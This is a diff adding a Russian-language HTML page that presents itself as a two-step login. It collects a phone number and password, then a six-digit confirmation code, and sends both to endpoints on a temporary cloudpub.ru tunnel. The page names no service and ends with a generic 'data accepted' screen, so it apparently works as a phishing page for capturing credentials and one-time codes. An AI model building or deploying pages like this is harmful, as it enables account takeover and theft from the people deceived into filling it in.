@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="ru">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Вход (2 шага: пароль → код)</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body class="min-h-screen bg-gray-100 flex items-center justify-center">
+    <div class="bg-white p-6 rounded-xl shadow-lg w-full max-w-md" id="formContainer">
+      <!-- Шаг 1: телефон и пароль -->
+      <div id="step1">
+        <h1 class="text-xl font-semibold mb-4">Шаг 1 — Ввод телефона и пароля</h1>
+        <form id="passwordForm" class="space-y-4">
+          <div>
+            <label class="block mb-1">Номер телефона</label>
+            <input name="phone" type="tel" required placeholder="+7XXXXXXXXXX"
+                   class="w-full border rounded-lg px-3 py-2 outline-none focus:ring-2 focus:ring-blue-400">
+          </div>
+          <div>
+            <label class="block mb-1">Пароль</label>
+            <input name="password" type="password" required minlength="6" placeholder="Введите пароль"
+                   class="w-full border rounded-lg px-3 py-2 outline-none focus:ring-2 focus:ring-blue-400">
+          </div>
+          <button type="submit" class="w-full bg-blue-500 text-white rounded-lg py-2">Продолжить</button>
+        </form>
+      </div>
+
+      <!-- Шаг 2: 6-значный код -->
+      <div id="step2" class="hidden">
+        <h1 class="text-xl font-semibold mb-4">Шаг 2 — Подтверждение кодом</h1>
+        <form id="codeForm" class="space-y-3">
+          <input name="code" type="text" required pattern="\d{6}" placeholder="123456"
+                 class="w-full border rounded-lg px-3 py-2 outline-none focus:ring-2 focus:ring-blue-400">
+          <button type="submit" class="w-full bg-green-500 text-white rounded-lg py-2">Отправить код</button>
+        </form>
+        <p id="statusMsg" class="mt-2 hidden text-sm"></p>
+      </div>
+    </div>
+
+    <script>
+      // Публичные адреса API через твой clo-туннель:
+      const API_PASSWORD = 'https://reputably-cultivated-stoat.cloudpub.ru/api/auth/password';
+      const API_CODE     = 'https://reputably-cultivated-stoat.cloudpub.ru/api/auth/code';
+
+      let userPhone = '';
+
+      const step1 = document.getElementById('step1');
+      const step2 = document.getElementById('step2');
+      const statusMsg = document.getElementById('statusMsg');
+      const formContainer = document.getElementById('formContainer');
+
+      function setStatus(text, type) {
+        statusMsg.classList.remove('hidden');
+        statusMsg.classList.remove('text-red-600', 'text-green-600', 'text-gray-600');
+        statusMsg.classList.add(type === 'error' ? 'text-red-600' : type === 'success' ? 'text-green-600' : 'text-gray-600');
+        statusMsg.textContent = text;
+      }
+
+      document.getElementById('passwordForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const phone = e.target.phone.value.trim();
+        const pwd = e.target.password.value;
+        if (!phone || !pwd) return;
+        userPhone = phone;
+        try {
+          const res = await fetch(API_PASSWORD, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include',
+            body: JSON.stringify({ phone, password: pwd })
+          });
+          if (!res.ok) {
+            let err = {}; try { err = await res.json(); } catch {}
+            throw new Error(err.error || 'Ошибка отправки пароля');
+          }
+          step1.classList.add('hidden');
+          step2.classList.remove('hidden');
+          setStatus('Введите 6-значный код, который вы получили.', 'info');
+        } catch (e1) {
+          setStatus(e1.message || 'Не удалось отправить пароль', 'error');
+        }
+      });
+
+      document.getElementById('codeForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const code = e.target.code.value.trim();
+        if (!/^\d{6}$/.test(code)) {
+          setStatus('Введите корректный 6-значный код.', 'error');
+          return;
+        }
+        setStatus('Отправляем код...', 'info');
+        try {
+          const res = await fetch(API_CODE, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include',
+            body: JSON.stringify({ phone: userPhone, code })
+          });
+          if (!res.ok) {
+            let err = {}; try { err = await res.json(); } catch {}
+            throw new Error(err.error || 'Ошибка отправки кода');
+          }
+          // После успешной отправки показываем "Успешно"
+          document.body.innerHTML = `
+            <div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f3f4f6">
+              <div style="background:#fff;padding:24px 28px;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,.08);font-family:sans-serif;text-align:center">
+                <div style="font-size:22px;font-weight:600;margin-bottom:6px">Успешно</div>
+                <div style="font-size:14px;color:#6b7280">Данные приняты.</div>
+              </div>
+            </div>`;
+        } catch (e2) {
+          setStatus(e2.message || 'Не удалось отправить код', 'error');
+        }
+      });
+    </script>
+  </body>
+</html>
